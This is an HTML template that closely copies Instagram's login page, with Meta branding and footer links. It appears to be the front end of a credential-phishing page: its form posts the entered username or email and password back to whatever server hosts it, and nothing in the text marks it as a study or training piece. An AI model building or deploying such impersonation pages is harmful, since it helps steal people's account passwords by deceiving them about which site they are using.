<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <link rel="stylesheet" href="../static/instagram.css" />
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <h1 class="logo">Instagram</h1>
      <form method="POST">
        <input type="text" name="email" placeholder="Phone number, username, or email" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit">Log in</button>
        <div class="divider"><span>OR</span></div>
        <a href="#" class="facebook-login">
          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
          Log in with Facebook
        </a>
        <a href="#" class="forgot">Forgot password?</a>
      </form>
    </div>

    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <div class="get-app">
      <p>Get the app.</p>
      <div class="store-buttons">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" />
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Microsoft_Store_badge_EN.svg" alt="Microsoft Store" />
      </div>
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading & Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <p>Â© 2025 Instagram from Meta</p>
  </footer>
</body>
</html>
